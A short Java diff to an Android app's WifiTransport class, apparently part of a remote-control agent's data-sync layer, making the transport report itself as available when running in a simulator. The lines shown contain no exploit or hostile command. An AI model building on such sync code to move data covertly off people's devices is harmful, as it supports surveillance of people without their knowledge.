@@ -11,6 +11,7 @@ package com.ht.RCSAndroidGUI.action.sync;
 import android.content.Context;
 import android.net.wifi.WifiManager;
 
+import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Status;
 
 // TODO: Auto-generated Javadoc
@@ -65,6 +66,9 @@ public class WifiTransport extends HttpTransport {
 			}
 		}
 
+		if (Device.self().isSimulator()) {
+			return true;
+		}
 		return available;
 	}
 
